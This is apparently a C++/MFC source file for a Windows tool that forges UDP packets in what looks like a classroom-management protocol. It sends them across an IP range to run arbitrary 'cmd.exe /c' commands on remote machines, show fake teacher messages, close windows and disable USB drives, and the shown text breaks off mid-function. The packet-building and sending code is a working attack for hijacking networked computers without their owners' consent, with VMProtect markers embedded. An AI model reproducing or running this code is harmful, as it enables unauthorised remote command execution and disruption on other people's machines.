// netw.cpp : 实现文件
//

#include "stdafx.h"
#include "去除控制.h"
#include "netw.h"
#include "afxdialogex.h"
#include<iostream>
#include <windows.h>
#include <windowsx.h>
#include <iostream>
#include <tlhelp32.h>
#include <cstring>
#include <locale.h>
#include <cstdio>
#include <atlbase.h>

using namespace std;

// netw 对话框
BOOL FPt(char *pProcess)
{
	//if(heihei==0) return false;
	//WCHAR* pProcess=0;

	int i=0;
	i=0;
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);
	HANDLE hProcessSnap = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if(hProcessSnap == INVALID_HANDLE_VALUE)
	{
		return false;
	}
	BOOL bMore = ::Process32First(hProcessSnap, &pe32);
	while(bMore)
	{
		USES_CONVERSION;
		char* test1 = W2A(pe32.szExeFile);//转化成默认
		if(stricmp(pProcess,test1) == 0)
		{

			return 1;
		}
		bMore = ::Process32Next(hProcessSnap, &pe32);
	}

	return 0;
}

IMPLEMENT_DYNAMIC(netw, CDialogEx)

netw::netw(CWnd* pParent /*=NULL*/)
	: CDialogEx(netw::IDD, pParent)
{

}

netw::~netw()
{
}

void netw::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

int udpsend(char *adre,char *dat,int bagdx,int port)  
{  
	//加载套接字库  
	WORD wVersionRequested;  
	WSADATA wsaData;  
	int err;  

	wVersionRequested = MAKEWORD( 2, 2 );  

	err = WSAStartup( wVersionRequested, &wsaData );  
	if ( err != 0 ) {  
		return -1;  
	}  

	if ( LOBYTE( wsaData.wVersion ) != 2 ||  
		HIBYTE( wsaData.wVersion ) != 2 ) {                                 
			WSACleanup( );  
			return -1;   
	}  

	//创建套接字  
	SOCKET sockClient = socket(AF_INET, SOCK_DGRAM, 0);  
	if (INVALID_SOCKET == sockClient)  
		//printf("socket() called failed! The error code is: %d\n", WSAGetLastError());  
		return -1;  


	SOCKADDR_IN addrServer;  
	addrServer.sin_addr.S_un.S_addr = inet_addr(adre);  
	addrServer.sin_family = AF_INET;  
	addrServer.sin_port = htons(port);  

	//发送数据  
	err = sendto(sockClient, dat, bagdx, 0, (SOCKADDR*)&addrServer, sizeof(SOCKADDR));  
	if (SOCKET_ERROR == err)  
		return -1;  

	//关闭套接字  
	closesocket(sockClient);  

	//终止套接字库的使用  
	WSACleanup();  

	return 0;  
}
BEGIN_MESSAGE_MAP(netw, CDialogEx)
	ON_BN_CLICKED(IDC_BUTTON14, &netw::OnBnClickedButton14)
	ON_EN_CHANGE(IDC_IPADDRESS1, &netw::OnEnChangeEdit6)
	ON_EN_CHANGE(IDC_EDIT1, &netw::OnEnChangeEdit1)
	ON_BN_CLICKED(IDC_BUTTON2, &netw::OnBnClickedButton2)
	ON_EN_CHANGE(IDC_EDIT8, &netw::OnEnChangeEdit8)
	ON_BN_CLICKED(IDC_BUTTON13, &netw::OnBnClickedButton13)
	ON_BN_CLICKED(IDC_BUTTON1, &netw::OnBnClickedButton1)
	ON_BN_CLICKED(IDC_BUTTON3, &netw::OnBnClickedButton3)
	ON_EN_CHANGE(IDC_EDIT10, &netw::OnEnChangeEdit10)
	ON_BN_CLICKED(IDC_BUTTON4, &netw::OnBnClickedButton4)
	ON_BN_CLICKED(IDC_BUTTON5, &netw::OnBnClickedButton5)
	ON_WM_DROPFILES()
	ON_EN_CHANGE(IDC_EDIT5, &netw::OnEnChangeEdit5)
	ON_BN_CLICKED(IDC_BUTTON7, &netw::OnBnClickedButton7)
	ON_BN_CLICKED(IDC_BUTTON6, &netw::OnBnClickedButton6)
	ON_NOTIFY(IPN_FIELDCHANGED, IDC_IPADDRESS1, &netw::OnIpnFieldchangedIpaddress1)
END_MESSAGE_MAP()


// netw 消息处理程序
char *getip()
{

	WSADATA wsaData; 
	char name[155]; 
	char *ip; 
	PHOSTENT hostinfo; 
	if ( WSAStartup( MAKEWORD(2,0), &wsaData ) == 0 ) 
	{ 
		if( gethostname ( name, sizeof(name)) == 0) 
		{ 
			if((hostinfo = gethostbyname(name)) != NULL) 
			{ 
				ip = inet_ntoa (*(struct in_addr *)*hostinfo->h_addr_list); 
				return ip;
			} 
		} 
		WSACleanup( ); 
	}
	return "NO INTELNET";
}
HWND kp;
CWnd *twrp;
extern HWND h;
CProgressCtrl *jindu;
BOOL netw::OnInitDialog()
{
	jindu = (CProgressCtrl *)GetDlgItem(IDC_PROGRESS1);
	jindu->SetRange(0,255);
	USES_CONVERSION;
	::ShowWindow(h,SW_HIDE);
	CDialogEx::OnInitDialog();
	SetDlgItemText(IDC_IPADDRESS1,A2W(getip()));
	SetDlgItemText(IDC_IPADDRESS2,A2W(getip()));
	// TODO:  在此添加额外的初始化
	twrp=FindWindow(NULL,L"NetWorkTool");
	kp=twrp->m_hWnd;
	
	SetDlgItemText(IDC_EDIT1,L"1");
	SetDlgItemText(IDC_EDIT2,L"192.168.1.1");
	SetDlgItemText(IDC_EDIT3,L"4705");
	SetDlgItemText(IDC_EDIT4,L"100");
	SetDlgItemText(IDC_EDIT7,L"请到老师这儿来一趟");
	SetDlgItemText(IDC_EDIT8,L"taskmgr");
	SetDlgItemText(IDC_EDIT12,A2W(getip()));
	SetDlgItemText(IDC_EDIT10,L"commond.txt");
	SetDlgItemText(IDC_EDIT5,L"请把文件拖到窗口里");
	SetDlgItemText(IDC_EDIT13,L"3");
	SetDlgItemText(IDC_EDIT14,L"4705");
	((CButton*)GetDlgItem(IDC_CHECK1))->SetCheck(BST_CHECKED); 
	return true; 
	// return TRUE unless you set the focus to a control
	// 异常: OCX 属性页应返回 FALSE
}

int randnum2(int fm,int lm)
{
	return (rand() % (lm-fm+1))+ fm;
}

bool sendcmd(TCHAR *comin,int sleeptime)
{
	__asm 
	{
			_emit 0xEB
			_emit 0x10
			_emit 0x56
			_emit 0x4D
			_emit 0x50
			_emit 0x72
			_emit 0x6F
			_emit 0x74
			_emit 0x65
			_emit 0x63
			_emit 0x74
			_emit 0x20
			_emit 0x62
			_emit 0x65
			_emit 0x67
			_emit 0x69
			_emit 0x6E
			_emit 0x00
	}
	char datcmd[2000]={0x44,0x4D,0x4F,0x43,0x00,0x00,0x01,0x00,0x6E,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x4E,0x00,0x00,0xC0,0xA8,0x8E,0x01,0x61,0x03,0x00,0x00,0x61,0x03,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x0F,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x43,0x00,0x3A,0x00,0x5C,0x00,0x57,0x00,0x69,0x00,0x6E,0x00,0x64,0x00,0x6F,0x00,0x77,0x00,0x73,0x00,0x5C,0x00,0x73,0x00,0x79,0x00,0x73,0x00,0x74,0x00,0x65,0x00,0x6D,0x00,0x33,0x00,0x32,0x00,0x5C,0x00,0x63,0x00,0x6D,0x00,0x64,0x00,0x2E,0x00,0x65,0x00,0x78,0x00,0x65,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x2F,0x00,0x63,0x00,0x20,0x00};

	int cishu=1;
	cishu=GetDlgItemInt(kp,IDC_EDIT1, NULL, 1); 
	int duankou=4705;
	duankou=::GetDlgItemInt(kp,IDC_EDIT14, NULL, 1); 
	char adree[20];
	GetDlgItemTextA(kp,IDC_IPADDRESS1,adree,20);
	int leng=0;
	for(int l=strlen(adree);l>=0;l--)
		if(adree[l]=='.')
		{leng=l;break;}

	char stip[30]={0};char edip[30]={0};
	GetDlgItemTextA(kp,IDC_IPADDRESS1,stip,30);
	GetDlgItemTextA(kp,IDC_IPADDRESS2,edip,30);
	int stlen=strlen(stip)-1,sta=0;
	int edlen=strlen(edip)-1,eda=0;
	
	for(int k=stlen;k>=0;k--)
	{
		if(stip[k]=='.') 
		{
			for(int j=k+1;j<=stlen;j++)
			{
				sta=int(stip[j]-48)+sta*10;
				
			}
			break;
		}
	}
	for(int k=edlen;k>=0;k--)
	{
		if(edip[k]=='.') 
		{
			for(int j=k+1;j<=edlen;j++)
				eda=int(edip[j]-48)+eda*10;
			break;
		}
	}
	jindu->SetPos(0);
	for(int i=sta;i<=eda;i++)
	{
		adree[leng+1]=i/100+48;
		adree[leng+2]=(i/10)%10+48;
		adree[leng+3]=i%10+48;
		adree[leng+4]='\0';
		for(int j=leng+1;j<=leng+3;)
			if(adree[j]!='0') break;
			else
			{
				for(int l=j;l<=leng+3;l++) adree[l]=adree[l+1];
			}
		int topt=578;
		for(int i=0;i<wcslen(comin);i++)
		{

			unsigned int byte = comin[i];
			unsigned int high;
			unsigned int low ;
			high = (byte>>8)&0xff;
			low = byte & 0xff;
			datcmd[topt++]=low;
			datcmd[topt++]=high;
		}
		//MessageBoxA(kp,adree,adree,MB_OK);
		for(int i=1;i<=cishu;i++)
		{

			datcmd[12]=char(randnum2(56,70));
			datcmd[13]=char(randnum2(56,70));
			datcmd[16]=char(randnum2(56,70));
			datcmd[17]=char(randnum2(56,70));
			udpsend(adree,datcmd,1038,duankou);
			Sleep(sleeptime);
		}
		jindu->StepIt();

		
	}
	jindu->SetPos(255);
	return 1;
	__asm
	{
		_emit 0xEB
			_emit 0x0E
			_emit 0x56
			_emit 0x4D
			_emit 0x50
			_emit 0x72
			_emit 0x6F
			_emit 0x74
			_emit 0x65
			_emit 0x63
			_emit 0x74
			_emit 0x20
			_emit 0x65
			_emit 0x6E
			_emit 0x64
			_emit 0x00
	}
}
void netw::OnBnClickedButton14()
{
	srand(time(NULL));
	wchar_t comin[200];
	::GetDlgItemText(kp,IDC_EDIT8,comin,100);
	if(wcslen(comin)==0)
	{
		MessageBoxA(kp,"未输入","错误",MB_OK);
		return;
	}
	sendcmd(comin,0);
	if(((CButton *)GetDlgItem(IDC_CHECK1))->GetCheck())
		MessageBoxA(kp,"发送成功","报告",MB_OK);
	SetDlgItemText(IDC_EDIT11,L"你发送了一条命令");
}

	// TODO: 在此添加控件通知处理程序代码



void netw::OnEnChangeEdit6()
{
	// TODO:  如果该控件是 RICHEDIT 控件，它将不
	// 发送此通知，除非重写 CDialogEx::OnInitDialog()
	// 函数并调用 CRichEditCtrl().SetEventMask()，
	// 同时将 ENM_CHANGE 标志“或”运算到掩码中。
	// TODO:  在此添加控件通知处理程序代码
}


void netw::OnEnChangeEdit1()
{
	// TODO:  如果该控件是 RICHEDIT 控件，它将不
	// 发送此通知，除非重写 CDialogEx::OnInitDialog()
	// 函数并调用 CRichEditCtrl().SetEventMask()，
	// 同时将 ENM_CHANGE 标志“或”运算到掩码中。

	// TODO:  在此添加控件通知处理程序代码
}


void netw::OnBnClickedButton2()
{
	srand(time(NULL));
	char adree[20];
	GetDlgItemTextA(kp,IDC_EDIT2,adree,20);
	char fn[20];
	GetDlgItemTextA(kp,IDC_EDIT9,fn,20);
	int port=1;
	port=GetDlgItemInt(IDC_EDIT3, NULL, 1); 
	int bgdx=100;
	bgdx=GetDlgItemInt(IDC_EDIT4, NULL, 1);
	char databag[1000],num=0;;
	if(freopen(fn,"r",stdin))
	{
		int temp;
		while(cin>>temp)
			databag[num++]=temp;
		udpsend(adree,databag,bgdx,port);
		MessageBoxA(kp,"发送成功","报告",MB_OK);
	}
	else
		MessageBoxA(kp,"未找到数据包","报告",MB_OK);
	fclose(stdin);
	// TODO: 在此添加控件通知处理程序代码
}


void netw::OnEnChangeEdit8()
{
	// TODO:  如果该控件是 RICHEDIT 控件，它将不
	// 发送此通知，除非重写 CDialogEx::OnInitDialog()
	// 函数并调用 CRichEditCtrl().SetEventMask()，
	// 同时将 ENM_CHANGE 标志“或”运算到掩码中。

	// TODO:  在此添加控件通知处理程序代码
}


void netw::OnBnClickedButton13()
{
	jindu->SetPos(0);
	char datmsg[200]={0x44,0x4D,0x4F,0x43,0x00,0x00,0x01,0x00,0x9E,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x4E,0x00,0x00,0xC0,0xA8,0x8E,0x01,0x91,0x03,0x00,0x00,0x91,0x03,0x00,0x00,0x00,0x08,0x00,0x00,0x00,0x00,0x00,0x00,0x05,0x00,0x00,0x00};
	//for(int i=60;i<=800;i++) datmsg[i]=0;
	int cishu=1;
	cishu=::GetDlgItemInt(kp,IDC_EDIT1, NULL, 1); 
	int duankou=4705;
	duankou=::GetDlgItemInt(kp,IDC_EDIT14, NULL, 1); 
	char adree[20];
	GetDlgItemTextA(kp,IDC_IPADDRESS1,adree,20);
	int leng=0;
	for(int l=strlen(adree);l>=0;l--)
		if(adree[l]=='.')
		{leng=l;break;}

		char stip[30]={0};char edip[30]={0};
		GetDlgItemTextA(kp,IDC_IPADDRESS1,stip,30);
		GetDlgItemTextA(kp,IDC_IPADDRESS2,edip,30);
		int stlen=strlen(stip)-1,sta=0;
		int edlen=strlen(edip)-1,eda=0;

		for(int k=stlen;k>=0;k--)
		{
			if(stip[k]=='.') 
			{
				for(int j=k+1;j<=stlen;j++)
				{
					sta=int(stip[j]-48)+sta*10;

				}
				break;
			}
		}
		for(int k=edlen;k>=0;k--)
		{
			if(edip[k]=='.') 
			{
				for(int j=k+1;j<=edlen;j++)
					eda=int(edip[j]-48)+eda*10;
				break;
			}
		}

		wchar_t comin[100];
		::GetDlgItemText(kp,IDC_EDIT7,comin,100);
		if(wcslen(comin)==0)
		{
			MessageBoxA(kp,"未输入","错误",MB_OK);
			return;
		}
		
		for(int i=sta;i<=eda;i++)
		{
			adree[leng+1]=i/100+48;
			adree[leng+2]=(i/10)%10+48;
			adree[leng+3]=i%10+48;
			adree[leng+4]='\0';
			for(int j=leng+1;j<=leng+3;)
				if(adree[j]!='0') break;
				else
				{
					for(int l=j;l<=leng+3;l++) adree[l]=adree[l+1];
				}
				int topt=56;
				for(int i=0;i<wcslen(comin);i++)
				{

					unsigned int byte = comin[i];
					unsigned int high;
					unsigned int low ;
					high = (byte>>8)&0xff;
					low = byte & 0xff;
					datmsg[topt++]=low;
					datmsg[topt++]=high;
				}
				
				for(int i=1;i<=cishu;i++)
				{

					datmsg[12]=char(randnum2(56,70));
					datmsg[13]=char(randnum2(56,70));
					datmsg[16]=char(randnum2(56,70));
					datmsg[17]=char(randnum2(56,70));
					datmsg[18]=char(randnum2(56,70));
					udpsend(adree,datmsg,1038,duankou);
					Sleep(10);
				}
				jindu->StepIt();
		}
		jindu->SetPos(255);
	if(((CButton *)GetDlgItem(IDC_CHECK1))->GetCheck())
	MessageBoxA(kp,"发送成功","报告",MB_OK);
	SetDlgItemText(IDC_EDIT11,L"你发送了一条消息");
	return;
	// TODO: 在此添加控件通知处理程序代码
}


void netw::OnBnClickedButton1()
{
	srand(time(NULL));
	char adree[20];
	GetDlgItemTextA(kp,IDC_IPADDRESS1,adree,20);
	char dat[200]={0x44,0x4d,0x4f,0x43, 0x00,0x00,0x01,0x00,0x6e,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x4e,0x00,0x00,0xc0,0xa8,0x01,0x9b,0x61,0x03,0x00,0x00,0x61,0x03,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x0e,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0xe1,0x02,0x02,0x0b,0xa6,0x15,0xe1,0x02,0x02,0x0c,0xa9,0x15,0x01,0x00,0x11,0x2b,0x00,0x00,0x10,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x5e,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,0x50,0x00,0x00,0xa0,0x05,0x00,0x00,0x01,0x00,0x00,0x00,0x19,0x00,0x00,0x00,0x4b,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0xa8,0x01,0x9b,0x04,0x00,0x00,0x00,0x0c,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x03,0xe0,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
	 
	dat[16]=char(randnum2(56,70));
	dat[17]=char(randnum2(56,70));
	dat[18]=char(randnum2(56,70));
	int duankou=4705;
	duankou=::GetDlgItemInt(kp,IDC_EDIT14, NULL, 1); 
	udpsend(adree,dat,906,duankou);

	if(((CButton *)GetDlgItem(IDC_CHECK1))->GetCheck())
		MessageBoxA(kp,"发送成功","报告",MB_OK);
	SetDlgItemText(IDC_EDIT11,L"你关掉了一个窗口");
	// TODO: 在此添加控件通知处理程序代码
}


void netw::OnBnClickedButton3()
{
	srand(time(NULL));
	char adree[20];
	GetDlgItemTextA(kp,IDC_IPADDRESS1,adree,20);
	char dat[200]={0x44,0x4d,0x4f,0x43,0x00,0x00,0x01,0x00,0x95,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0c,0x00,0x00,0x00,0x00,0x00,0x30,0x40,0x00,0x00,0x20,0x4e,0x00,0x00,0xc0,0xa8,0x01,0x9b,0x88,0x00,0x00,0x00,0x88,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x06,0x00,0x00,0x00,0x7b,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x0a,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x50,0x00,0x00,0x00,0x50,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
	//char dat[200]={0x4d,0x45,0x53,0x53,0x01,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0xc0,0xa8,0x01,0x07,0x61,0x03,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x17,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xa0,0x05,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
	dat[16]=char(randnum2(56,70));
	dat[17]=char(randnum2(56,70));
	dat[18]=char(randnum2(56,70));
	int duankou=4705;
	duankou=::GetDlgItemInt(kp,IDC_EDIT14, NULL, 1); 
	udpsend(adree,dat,906,duankou);

	if(((CButton *)GetDlgItem(IDC_CHECK1))->GetCheck())
		MessageBoxA(kp,"设置成功","报告",MB_OK);
	// TODO: 在此添加控件通知处理程序代码
}


void netw::OnEnChangeEdit10()
{
	// TODO:  如果该控件是 RICHEDIT 控件，它将不
	// 发送此通知，除非重写 CDialogEx::OnInitDialog()
	// 函数并调用 CRichEditCtrl().SetEventMask()，
	// 同时将 ENM_CHANGE 标志“或”运算到掩码中。

	// TODO:  在此添加控件通知处理程序代码
}


char cfn[40];
char cmdd[130];
void netw::OnBnClickedButton4()
{
	srand(time(NULL));

	char adree[20];
	GetDlgItemTextA(kp,IDC_IPADDRESS1,adree,20);
	
	GetDlgItemTextA(kp,IDC_EDIT10,cfn,40);
	bool sudc=freopen(cfn,"r",stdin);

	if(sudc==0) 
	{
		MessageBoxA(kp,"未找到数据包","报告",MB_OK);
		return;
	}
	USES_CONVERSION;
	SetDlgItemText(IDC_EDIT11,A2W(cfn));
	int n;
	scanf("%d\n",&n);

	if(n>=20)
		MessageBoxA(kp,"命令文件过大会导致发送时间很长,请耐心等待","报告",MB_OK);

	
	for(int i=1;i<=n;i++)
	{
		gets(cmdd);
		
		sendcmd(A2W(cmdd),80);
		memset(cmdd,0,sizeof(cmdd));
	}
	MessageBoxA(kp,"发送成功","报告",MB_OK);
	
	fclose(stdin);
	// TODO: 在此添加控件通知处理程序代码
}

TCHAR szPath[MAX_PATH] = { 0 };
void netw::OnDropFiles(HDROP hDropInfo)
{

	UINT nCount = DragQueryFile(hDropInfo, 0xFFFFFFFF, NULL, 0);
	DragQueryFile(hDropInfo,0, szPath, MAX_PATH);
	::SetDlgItemTextW(kp,IDC_EDIT5,szPath);//在编辑框内显示路径
	DragFinish(hDropInfo);
	CDialogEx::OnDropFiles(hDropInfo);
}
char szFileFullPath[MAX_PATH],szProcessName[MAX_PATH];
char *getfilename()
{
	USES_CONVERSION;
	
	strcpy(szFileFullPath,W2A(szPath));//获取文件路径
	int length=strlen(szFileFullPath);
	for (int i=length-1; i>=0; i--) //从路径后面开始找\，即倒着找右斜杠
	{
		if (szFileFullPath[i]=='\\')//找到第一个\，就可以马上获取进程名称了
		{
			i++;
			for (int j=0; i<=length; j++) //结束符\0不能少,即i=length
			{
				szProcessName[j]=szFileFullPath[i++];
			}
			break;
		}
	}
	
	return szProcessName;
}

void netw::OnBnClickedButton5()
{
	
	srand(time(NULL));
	char adree[20];
	GetDlgItemTextA(kp,IDC_IPADDRESS1,adree,20);
	char dat[200]={0x4d,0x45,0x53,0x53,0x01,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0xc0,0xa8,0x01,0x07,0x61,0x03,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x17,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xa0,0x05,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
	dat[16]=char(randnum2(56,70));
	dat[17]=char(randnum2(56,70));
	dat[18]=char(randnum2(56,70));
	udpsend(adree,dat,881,5512);
	USES_CONVERSION;
	SetDlgItemText(IDC_EDIT11,L"U盘禁止使用");
	if(((CButton *)GetDlgItem(IDC_CHECK1))->GetCheck())
		MessageBoxA(kp,"设置成功","报告",MB_OK);
	// TODO: 在此添加控件通知处理程序代码
}



void netw::OnEnChangeEdit5()
{
	// TODO:  如果该控件是 RICHEDIT 控件，它将不
	// 发送此通知，除非重写 CDialogEx::OnInitDialog()
	// 函数并调用 CRichEditCtrl().SetEventMask()，
	// 同时将 ENM_CHANGE 标志“或”运算到掩码中。

	// TODO:  在此添加控件通知处理程序代码
}


void netw::OnBnClickedButton7()
{
	bool netfile=freopen("FTPserver.exe","r",stdin);
	fclose(stdin);
	if(netfile==0)
	{
		MessageBoxA(kp,"请下载网络增强模块并放置于本文件夹","报告",MB_OK);
		return;
	}
	if(wcslen(szPath)==0) 
	{
		MessageBoxA(kp,"请先选择一个文件","报告",MB_OK);
		return;
	}
	if(!FPt("FTPserver.exe"))
		WinExec("cmd /c start FTPserver.exe",SW_HIDE);
	MessageBoxA(kp,"请点击FTP中的启动服务按钮并将receiver.txt中IP地址改为自己的IP地址\n改完后即可发送，否则发不出去\n请勿关掉FTP服务器，可将其最小化","报告",MB_OK);
}

void netw::OnBnClickedButton6()
{
	
	bool sucp1=0;
	remove("C:/file.dat");
	CopyFile(szPath,L"C:/file.dat",sucp1);
	bool sudc=freopen("receiver.txt","r",stdin);
	if(!FPt("FTPserver.exe"))
	{
		MessageBoxA(kp,"服务器未启动","报告",MB_OK);
		return;
	}
	if(sudc==0) 
	{
		MessageBoxA(kp,"请将修改好的命令文件receiver.txt放于此文件夹","报告",MB_OK);
		return;
	}
	MessageBoxA(kp,"文件将发送请耐心等待","报告",MB_OK);
	int n;
	scanf("%d\n",&n);
	for(int i=1;i<=n;i++)
	{
